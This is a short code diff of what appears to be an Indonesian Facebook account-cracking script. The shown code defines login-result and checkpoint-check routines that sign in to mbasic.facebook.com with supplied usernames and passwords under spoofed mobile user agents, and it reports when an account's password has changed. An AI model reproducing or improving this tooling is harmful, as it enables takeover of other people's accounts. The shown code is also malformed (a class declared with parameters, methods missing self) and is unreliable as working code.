@@ -513,7 +513,7 @@ def userset():
     else:print(f"{P}[•] Pilihan salah ");exit()
 
 #####LOGIN HASIL
-class log_hasil(user, pasw):
+class log_hasil(user, pasw,dat,data2,data):
   def __init__():
       ua = "Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
       ses = requests.Session()
@@ -558,7 +558,7 @@ class log_hasil(user, pasw):
         print(f"{P}[•]{M}>>>> {oh}")
       else:
         print(f"{P}[•]{M} Akun tersebut sandi nya telah di ganti")
-   def cek_opsi(user, pasw):
+  def cek_opsi(user, pasw):
      global aman,cpsalah
      session=req.Session()
      session.headers.update({"Host":"mbasic.facebook.com","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9","referer":"https://mbasic.facebook.com/","user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"})
